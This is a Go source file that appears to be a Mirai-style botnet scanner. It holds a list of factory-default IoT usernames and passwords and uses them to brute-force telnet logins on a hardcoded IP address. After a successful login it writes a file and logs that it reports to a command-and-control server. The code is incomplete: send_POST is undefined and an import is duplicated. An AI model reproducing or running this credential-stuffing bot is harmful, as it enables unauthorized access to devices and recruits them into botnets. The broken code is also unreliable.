package main

import (
	"context"
	"log"
	"os"
	"time"
	telnet "github.com/ziutek/telnet"
	log "github.com/Sirupsen/logrus"
)

const timeout = 10 * time.Second

func checkErr(err error) {
	if err != nil {
		log.Println("Error:", err)
	}
}

func expect(t *telnet.Conn, d ...string) {
	checkErr(t.SetReadDeadline(time.Now().Add(timeout)))
	checkErr(t.SkipUntil(d...))
}

func sendln(t *telnet.Conn, s string) {
	checkErr(t.SetWriteDeadline(time.Now().Add(timeout)))
	buf := make([]byte, len(s)+1)
	copy(buf, s)
	buf[len(s)] = '\n'
	_, err := t.Write(buf)
	checkErr(err)
}

func main() {

	users := [...]string{"test", "root", "root", "root", "admin", "root", "root", "root", "root", "root", "root", "support", "admin", "root", "root", "user", "root", "admin", "root", "admin", "admin", "root", "root", "root", "root", "Administrator", "service", "supervisor", "guest", "guest", "guest", "admin1", "administrator", "666666", "888888", "ubnt", "root", "root", "root", "root", "root", "root", "root", "root", "root", "root", "root", "root", "root", "root", "admin", "admin", "admin", "admin", "admin", "admin", "admin", "admin", "admin", "tech", "mother"}

	passwds := [...]string{"test", "xc3511", "vizxv", "admin", "admin", "888888", "xmhdipc", "default", "juantech", "123456", "54321", "support", "password", "root", "12345", "user", "pass", "admin1234", "1111", "smcadmin", "1111", "666666", "password", "1234", "klv123", "admin", "service", "supervisor", "guest", "12345", "12345", "password", "1234", "666666", "888888", "ubnt", "klv1234", "Zte521", "hi3518", "jvbzd", "anko", "zlxx.", "7ujMko0vizxv", "7ujMko0admin", "system", "ikwb", "dreambox", "user", "realtek", "00000000", "1111111", "1234", "12345", "54321", "123456", "7ujMko0admin", "1234", "pass", "meinsm", "tech", "fucker"}

	var data []byte

	for i := 0; i < len(users); i++ {
		log.Printf("Checking %s:%s\n", users[i], passwds[i])
		user := users[i]
		passwd := passwds[i]
		dst_ip := random_ip()
		dst := dst_ip + ":23"

		t, err := telnet.Dial("tcp", dst)
		checkErr(err)
		t.SetUnixWriteMode(true)

		expect(t, "login: ")
		sendln(t, user)
		expect(t, "ssword: ")
		sendln(t, passwd)

		ctx, cancel := context.WithTimeout(context.Background(), 3*time.Second)
		defer cancel()

		select {
		case <-time.After(1 * time.Second):
			expect(t, "#")
		case <-ctx.Done():
			log.Println(ctx.Err()) // prints "aqui"
			log.Printf("Login unsuccessfull")
			continue
		}
		log.Printf("Login successfull!")
		sendln(t, "echo 'hiiiiii' » /hithere")

		data, err = t.ReadBytes('$')
		log.Printf("Sending POST request to CnC...")
		send_POST()
		log.Printf("POST request successfull")
		log.Printf("Shutting down bot")
		
	

	}
	os.Stdout.Write(data)
	os.Stdout.WriteString("\n")
}

//user=user&passwd=passwd&ip=iowe

func random_ip() string {

	// a := 212
	// b := 237
	// c := 16
	// d := 229
	//ip:= a+b+c+d
	//fmt.Println(ip)
	log.Printf("Generating random IP (not really)")
	e := "212.237.16.229"
	//212.237.16.229
	return e

}

